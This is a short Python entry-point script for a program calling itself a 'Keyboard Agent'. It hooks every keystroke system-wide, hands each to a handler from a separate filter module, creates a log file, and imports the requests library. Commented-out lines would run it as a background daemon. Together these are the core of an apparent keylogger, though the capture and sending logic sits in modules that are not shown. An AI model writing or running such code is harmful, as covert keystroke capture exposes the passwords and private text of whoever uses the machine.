import requests
import keyboard
from filter import key_pressed
import os.path
from config import FILE_NAME
# import daemon

if os.path.exists(FILE_NAME) == False: 
    with open(FILE_NAME, "w") as file: 
        file.write("Welcome to Keyboard Agent Console!!!\n...\n")

def do_main_programm():  
    print("succesfuly started ;)")
    keyboard.hook(key_pressed)
    keyboard.wait()


do_main_programm()
# with daemon.DaemonContext():
#     do_main_programm()